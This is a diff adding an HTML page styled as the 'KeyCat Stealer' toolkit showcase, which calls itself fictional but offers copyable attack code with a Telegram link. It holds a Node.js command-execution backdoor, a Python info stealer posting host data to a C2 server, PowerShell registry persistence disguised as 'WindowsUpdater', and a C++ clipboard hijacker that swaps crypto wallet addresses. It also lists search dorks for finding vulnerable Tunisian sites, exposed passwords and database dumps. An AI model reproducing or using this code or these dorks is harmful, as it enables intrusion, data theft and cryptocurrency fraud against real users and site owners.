@@ -1,1 +1,478 @@
-<center><strong><em>KeyCat STealer Web - update</em></strong></center>
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KeyCat Store | Ultimate Edition</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        keycat: {
+                            dark: '#09090b',
+                            panel: '#18181b',
+                            accent: '#8b5cf6', // Violet
+                            highlight: '#06b6d4', // Cyan
+                            danger: '#ef4444',
+                            success: '#22c55e'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['Fira Code', 'monospace'],
+                    },
+                    animation: {
+                        'walk': 'walk 20s linear infinite',
+                        'float': 'float 4s ease-in-out infinite',
+                        'pulse-glow': 'pulse-glow 2s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                    },
+                    keyframes: {
+                        walk: {
+                            '0%': { transform: 'translateX(-150px)' },
+                            '100%': { transform: 'translateX(105vw)' },
+                        },
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0)' },
+                            '50%': { transform: 'translateY(-10px)' },
+                        },
+                        'pulse-glow': {
+                            '0%, 100%': { opacity: 1, boxShadow: '0 0 10px #06b6d4' },
+                            '50%': { opacity: .5, boxShadow: '0 0 20px #8b5cf6' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body { background-color: #09090b; color: #e2e8f0; }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #18181b; }
+        ::-webkit-scrollbar-thumb { background: #3f3f46; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #8b5cf6; }
+
+        /* Code Block */
+        .code-wrapper {
+            background: #0c0c0e;
+            border: 1px solid #27272a;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+        .code-header {
+            background: #18181b;
+            padding: 0.5rem 1rem;
+            border-bottom: 1px solid #27272a;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .code-content {
+            padding: 1rem;
+            overflow-x: auto;
+            font-size: 0.85rem;
+            line-height: 1.5;
+        }
+        .copy-btn {
+            background: #27272a;
+            color: #fff;
+            border: none;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .copy-btn:hover { background: #06b6d4; color: #000; }
+
+        /* Cat Animation */
+        .cat-container {
+            position: fixed;
+            bottom: 10px;
+            left: -150px;
+            z-index: 50;
+            filter: drop-shadow(0 0 8px #06b6d4);
+        }
+
+        .glass-card {
+            background: rgba(24, 24, 27, 0.6);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+    </style>
+</head>
+<body class="antialiased relative overflow-x-hidden">
+
+    <!-- Header -->
+    <header class="fixed top-0 w-full z-40 glass-card border-b border-gray-800">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center gap-2">
+                    <span class="text-2xl">🐱</span>
+                    <span class="font-bold text-xl text-white">KeyCat<span class="text-keycat-highlight">.Stealer</span></span>
+                </div>
+                <nav class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-8">
+                        <a href="#map" class="text-keycat-highlight font-bold px-3 py-2 rounded-md text-sm">Map</a>
+                        <a href="#code" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm">Codes</a>
+                        <a href="#dorks" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm">Dorks</a>
+                    </div>
+                </nav>
+                <a href="https://t.me/KeyCatStealer" target="_blank" class="bg-keycat-accent hover:bg-violet-600 text-white px-4 py-2 rounded-md text-sm font-bold transition-all shadow-[0_0_15px_rgba(139,92,246,0.5)]">
+                    Join Telegram
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero -->
+    <section class="pt-32 pb-12 px-4 relative">
+        <div class="absolute top-20 left-0 w-full h-64 bg-keycat-accent/10 rounded-full blur-[120px] -z-10"></div>
+        <div class="max-w-4xl mx-auto text-center animate-float">
+            <span class="text-keycat-highlight font-mono text-sm tracking-widest mb-4 block">/// TUNISIA CONCEPT ///</span>
+            <h1 class="text-5xl md:text-7xl font-bold text-white mb-6">The <span class="text-transparent bg-clip-text bg-gradient-to-r from-keycat-accent to-keycat-highlight">KeyCat</span> Arsenal</h1>
+            <p class="text-xl text-gray-400 mb-8 max-w-2xl mx-auto">
+                🐱 The ultimate fictional stealer concept born in Tunisia 🇹🇳. 
+                <br>Equip yourself with advanced dorks, stealth codes, and reverse connections.
+            </p>
+        </div>
+    </section>
+
+    <!-- Category 1: Keyboard Cat Map (Functions) -->
+    <section id="map" class="py-12 px-4 bg-keycat-panel/30 border-y border-gray-800">
+        <div class="max-w-6xl mx-auto">
+            <h2 class="text-3xl font-bold text-white mb-8 flex items-center gap-3"><span class="text-keycat-highlight">🗺️</span> Keyboard Cat Map</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Connection Tool -->
+                <div class="p-6 rounded-xl border border-gray-700 bg-black/40 hover:border-keycat-accent transition-all group">
+                    <h3 class="text-lg font-bold text-white mb-2">Reverse Connection</h3>
+                    <p class="text-gray-400 text-sm mb-4">Generate a payload for reverse shell connection.</p>
+                    <input type="text" placeholder="IP: 127.0.0.1" class="w-full bg-gray-900 border border-gray-700 rounded px-3 py-2 mb-2 text-white font-mono text-sm focus:border-keycat-highlight outline-none">
+                    <input type="text" placeholder="PORT: 4444" class="w-full bg-gray-900 border border-gray-700 rounded px-3 py-2 mb-4 text-white font-mono text-sm focus:border-keycat-highlight outline-none">
+                    <button onclick="alert('Payload Copied!')" class="w-full py-2 bg-keycat-accent/20 text-keycat-accent border border-keycat-accent rounded font-bold hover:bg-keycat-accent hover:text-white transition-all">GENERATE PAYLOAD</button>
+                </div>
+
+                <!-- Code: JS Backdoor -->
+                <div class="col-span-1 md:col-span-2 lg:col-span-2 p-6 rounded-xl border border-gray-700 bg-black/40">
+                    <div class="flex justify-between items-center mb-4">
+                        <h3 class="text-lg font-bold text-keycat-highlight">DC Backdoor (JS)</h3>
+                        <span class="text-xs text-gray-500 font-mono">domain_controller.js</span>
+                    </div>
+                    <div class="code-wrapper">
+                        <div class="code-header">
+                            <span class="text-gray-400 text-xs">JavaScript</span>
+                            <button class="copy-btn" onclick="copyToClipboard(this)">COPY</button>
+                        </div>
+                        <div class="code-content text-gray-300 font-mono">
+<pre><span class="text-purple-400">const</span> http = <span class="text-purple-400">require</span>(<span class="text-green-400">'http'</span>);
+<span class="text-purple-400">const</span> { exec } = <span class="text-purple-400">require</span>(<span class="text-green-400">'child_process'</span>);
+
+<span class="text-gray-500">// Hidden HTTP Server for C2</span>
+<span class="text-purple-400">const</span> server = http.createServer((req, res) => {
+    <span class="text-purple-400">if</span> (req.url === <span class="text-green-400">'/admin/cmd'</span>) {
+        <span class="text-gray-500">// Execute system command from query param</span>
+        <span class="text-purple-400">const</span> cmd = req.query.c;
+        exec(cmd, (error, stdout, stderr) => {
+            res.writeHead(<span class="text-blue-400">200</span>, { <span class="text-green-400">'Content-Type'</span>: <span class="text-green-400">'text/plain'</span> });
+            res.end(stdout || stderr);
+        });
+    }
+});
+server.listen(<span class="text-blue-400">8080</span>, () => console.log(<span class="text-green-400">'DC Backdoor Active...'</span>));</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Category 2: Codes Expanded -->
+    <section id="code" class="py-12 px-4">
+        <div class="max-w-6xl mx-auto">
+            <h2 class="text-3xl font-bold text-white mb-8 flex items-center gap-3"><span class="text-keycat-accent">💻</span> Advanced Codes</h2>
+            
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                
+                <!-- Python Stealer -->
+                <div class="bg-gray-900/50 p-6 rounded-xl border border-gray-800">
+                    <h3 class="text-xl font-bold text-white mb-4">Python Info Stealer</h3>
+                    <div class="code-wrapper">
+                        <div class="code-header">
+                            <span class="text-gray-400 text-xs">Python 3</span>
+                            <button class="copy-btn" onclick="copyToClipboard(this)">COPY</button>
+                        </div>
+                        <div class="code-content text-gray-300 font-mono">
+<pre><span class="text-purple-400">import</span> os, socket, platform, requests
+<span class="text-purple-400">from</span> subprocess <span class="text-purple-400">import</span> check_output
+
+<span class="text-purple-400">def</span> <span class="text-blue-400">exfiltrate</span>():
+    data = {
+        <span class="text-green-400">"hostname"</span>: socket.gethostname(),
+        <span class="text-green-400">"ip"</span>: socket.gethostbyname(socket.gethostname()),
+        <span class="text-green-400">"platform"</span>: platform.system(),
+        <span class="text-green-400">"user"</span>: os.getlogin()
+    }
+    
+    <span class="text-gray-500"># Send to C2 Server</span>
+    <span class="text-purple-400">try</span>:
+        r = requests.post(<span class="text-green-400">"http://c2.keycat.tn/api/data"</span>, json=data)
+        <span class="text-purple-400">print</span>(f<span class="text-green-400">"Sent: {r.status_code}"</span>)
+    <span class="text-purple-400">except</span> Exception <span class="text-purple-400">as</span> e:
+        <span class="text-purple-400">print</span>(<span class="text-green-400">"Connection Failed"</span>)
+
+exfiltrate()</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PowerShell Persistence -->
+                <div class="bg-gray-900/50 p-6 rounded-xl border border-gray-800">
+                    <h3 class="text-xl font-bold text-white mb-4">PowerShell Persistence</h3>
+                    <div class="code-wrapper">
+                        <div class="code-header">
+                            <span class="text-gray-400 text-xs">PowerShell</span>
+                            <button class="copy-btn" onclick="copyToClipboard(this)">COPY</button>
+                        </div>
+                        <div class="code-content text-gray-300 font-mono">
+<pre><span class="text-gray-500"># Add to Registry Startup Key</span>
+ $RegPath = <span class="text-green-400">"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</span>
+ $ValueName = <span class="text-green-400">"WindowsUpdater"</span>
+ $PayloadPath = <span class="text-green-400">"C:\Temp\update.exe"</span>
+
+<span class="text-purple-400">if</span> (-not (Test-Path $RegPath)) {
+    New-Item -Path $RegPath -Force
+}
+
+Set-ItemProperty -Path $RegPath -Name $ValueName -Value $PayloadPath
+Write-Host <span class="text-green-400">"Persistence established."</span></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- C++ Clipper -->
+                <div class="bg-gray-900/50 p-6 rounded-xl border border-gray-800 lg:col-span-2">
+                    <h3 class="text-xl font-bold text-white mb-4">C++ Clipboard Hijacker</h3>
+                    <div class="code-wrapper">
+                        <div class="code-header">
+                            <span class="text-gray-400 text-xs">C++</span>
+                            <button class="copy-btn" onclick="copyToClipboard(this)">COPY</button>
+                        </div>
+                        <div class="code-content text-gray-300 font-mono">
+<pre><span class="text-purple-400">#include</span> &lt;windows.h&gt;
+<span class="text-purple-400">#include</span> &lt;iostream&gt;
+
+<span class="text-purple-400">int</span> main() {
+    <span class="text-gray-500">// Original Wallet Address</span>
+    <span class="text-purple-400">char</span>* original = <span class="text-green-400">"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"</span>;
+    <span class="text-gray-500">// Hacker Address</span>
+    <span class="text-purple-400">char</span>* replacement = <span class="text-green-400">"HackerWalletAddressHere..."</span>;
+
+    <span class="text-purple-400">while</span> (<span class="text-blue-400">true</span>) {
+        <span class="text-purple-400">if</span> (OpenClipboard(NULL)) {
+            HANDLE hData = GetClipboardData(CF_TEXT);
+            <span class="text-purple-400">if</span> (hData != NULL) {
+                <span class="text-purple-400">char</span>* pszText = <span class="text-purple-400">static_cast</span>&lt;<span class="text-purple-400">char</span>*&gt;(GlobalLock(hData));
+                <span class="text-purple-400">if</span> (strstr(pszText, original)) {
+                    <span class="text-gray-500">// Replace address</span>
+                    EmptyClipboard();
+                    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, strlen(replacement) + 1);
+                    memcpy(GlobalLock(hMem), replacement, strlen(replacement) + 1);
+                    SetClipboardData(CF_TEXT, hMem);
+                }
+                GlobalUnlock(hData);
+            }
+            CloseClipboard();
+        }
+        Sleep(<span class="text-blue-400">100</span>);
+    }
+    <span class="text-purple-400">return</span> <span class="text-blue-400">0</span>;
+}</pre>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- Category 3: MASSIVE DORKS -->
+    <section id="dorks" class="py-12 px-4 bg-gray-900/30 border-t border-gray-800">
+        <div class="max-w-6xl mx-auto">
+            <h2 class="text-3xl font-bold text-white mb-8 flex items-center gap-3"><span class="text-red-500">🔍</span> KeyCat Dorks (Tunisia & Global)</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <!-- Col 1: SQL Injection & Endpoints -->
+                <div class="space-y-4">
+                    <h3 class="text-keycat-highlight font-bold mb-2">SQLi & Endpoints (.tn)</h3>
+                    
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Basic SQL Injection</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn ".php?id=" AND 1=1</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Admin Login Pages</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn inurl:admin inurl:login</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Joomla Sites</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn inurl:"index.php?option=com_"</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">WordPress Config</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn inurl:wp-config.php</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">PHP Error Logs</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn "PHP Warning" "mysql_fetch_array()"</code>
+                    </div>
+                </div>
+
+                <!-- Col 2: Files & Directories -->
+                <div class="space-y-4">
+                    <h3 class="text-keycat-highlight font-bold mb-2">Sensitive Files (.tn)</h3>
+                    
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">SQL Database Dumps</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn filetype:sql "INSERT INTO" "admin"</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Environment Variables</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn filetype:env DB_PASSWORD</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Open Directories</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn intitle:"index of" "backup"</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Excel Spreadsheets</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn filetype:xls "password" OR "secret"</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-keycat-highlight transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">PDF Documents</p>
+                        <code class="text-sm text-keycat-highlight break-all">site:.tn filetype:pdf "confidential" OR "rapport"</code>
+                    </div>
+                </div>
+
+                <!-- Col 3: Global Dorks & Bad Sites -->
+                <div class="space-y-4">
+                    <h3 class="text-keycat-danger font-bold mb-2">Global Dorks & Malware</h3>
+                    
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-red-500 transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Exposed RDP Ports</p>
+                        <code class="text-sm text-red-400 break-all">intitle:"Remote Desktop Connection" country:TN</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-red-500 transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Webcams / IoT</p>
+                        <code class="text-sm text-red-400 break-all">inurl:"top.htm" inurl:"currenttime"</code>
+                    </div>
+                    <div class="bg-black/40 p-3 rounded border border-gray-800 hover:border-red-500 transition-colors cursor-pointer" onclick="copyText(this.querySelector('code').innerText)">
+                        <p class="text-xs text-gray-500 mb-1">Git Config Exposed</p>
+                        <code class="text-sm text-red-400 break-all">site:.tn inurl:".git" "config"</code>
+                    </div>
+                    
+                    <!-- Bad Sites Section -->
+                    <div class="mt-6 pt-4 border-t border-gray-800">
+                        <h4 class="text-red-400 font-bold text-sm mb-2">🚫 Top Malicious Categories (.tn)</h4>
+                        <ul class="text-xs text-gray-400 space-y-2 font-mono">
+                            <li>1. <span class="text-white">phishing-tunisie[.]com</span> (Banking Scams)</li>
+                            <li>2. <span class="text-white">tn-stream-warez[.]net</span> (Malware hosting)</li>
+                            <li>3. <span class="text-white">card-shop-tn[.]xyz</span> (Stolen cards)</li>
+                            <li>4. <span class="text-white">free-dlc-games[.]tn</span> (Game exploit sites)</li>
+                            <li>5. <span class="text-white">tunisia-crack-tools[.]org</span> (Fake cracks)</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="border-t border-gray-800 bg-black py-8 text-center">
+        <p class="text-gray-500 text-sm">KeyCat © 2023. <br>Join the Channel: <a href="https://t.me/KeyCatStealer" class="text-keycat-accent hover:underline">t.me/KeyCatStealer</a></p>
+    </footer>
+
+    <!-- ADVANCED WALKING CAT ANIMATION -->
+    <div class="cat-container animate-walk">
+        <svg width="80" height="80" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <!-- Body Glow -->
+            <defs>
+                <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
+                    <feGaussianBlur stdDeviation="2" result="blur"/>
+                    <feComposite in="SourceGraphic" in2="blur" operator="over"/>
+                </filter>
+            </defs>
+            
+            <!-- Tail -->
+            <path d="M15 60 Q -10 40, 5 20" stroke="#06b6d4" stroke-width="3" fill="none" stroke-linecap="round">
+                <animate attributeName="d" values="M15 60 Q -10 40, 5 20; M15 60 Q 0 35, 10 25; M15 60 Q -10 40, 5 20" dur="1s" repeatCount="indefinite"/>
+            </path>
+            
+            <!-- Back Legs -->
+            <path d="M25 70 L 20 85" stroke="#8b5cf6" stroke-width="3" stroke-linecap="round">
+                <animate attributeName="d" values="M25 70 L 20 85; M25 70 L 30 80; M25 70 L 20 85" dur="0.5s" repeatCount="indefinite"/>
+            </path>
+            
+            <!-- Body -->
+            <rect x="20" y="40" width="60" height="35" rx="10" fill="#18181b" stroke="#06b6d4" stroke-width="2" filter="url(#glow)"/>
+            
+            <!-- Front Legs -->
+            <path d="M70 75 L 70 90" stroke="#8b5cf6" stroke-width="3" stroke-linecap="round">
+                 <animate attributeName="d" values="M70 75 L 70 90; M70 75 L 60 85; M70 75 L 70 90" dur="0.5s" repeatCount="indefinite" begin="0.25s"/>
+            </path>
+
+            <!-- Head -->
+            <circle cx="85" cy="50" r="18" fill="#18181b" stroke="#06b6d4" stroke-width="2" filter="url(#glow)"/>
+            
+            <!-- Ears -->
+            <path d="M72 40 L 65 25 L 82 38 Z" fill="#18181b" stroke="#06b6d4" stroke-width="2"/>
+            <path d="M98 40 L 105 25 L 88 38 Z" fill="#18181b" stroke="#06b6d4" stroke-width="2"/>
+            
+            <!-- Eyes -->
+            <circle cx="80" cy="45" r="2" fill="#06b6d4" class="animate-pulse"/>
+            <circle cx="92" cy="45" r="2" fill="#06b6d4" class="animate-pulse"/>
+            
+            <!-- Whiskers -->
+            <path d="M70 50 L 55 48" stroke="#4b5563" stroke-width="1"/>
+            <path d="M70 55 L 55 58" stroke="#4b5563" stroke-width="1"/>
+            <path d="M100 50 L 115 48" stroke="#4b5563" stroke-width="1"/>
+            <path d="M100 55 L 115 58" stroke="#4b5563" stroke-width="1"/>
+            
+            <!-- Key Icon on body -->
+            <text x="40" y="60" font-family="Arial" font-size="16" fill="#8b5cf6">🔑</text>
+        </svg>
+    </div>
+
+    <script>
+        // Copy functionality for code blocks
+        function copyToClipboard(btn) {
+            const codeContent = btn.closest('.code-wrapper').querySelector('pre').innerText;
+            navigator.clipboard.writeText(codeContent).then(() => {
+                const originalText = btn.innerText;
+                btn.innerText = 'COPIED!';
+                btn.style.background = '#06b6d4';
+                btn.style.color = 'black';
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.style.background = '';
+                    btn.style.color = '';
+                }, 1500);
+            });
+        }
+
+        // Copy functionality for dork cards
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Dork Copied: ' + text);
+            });
+        }
+    </script>
+</body>
+</html>
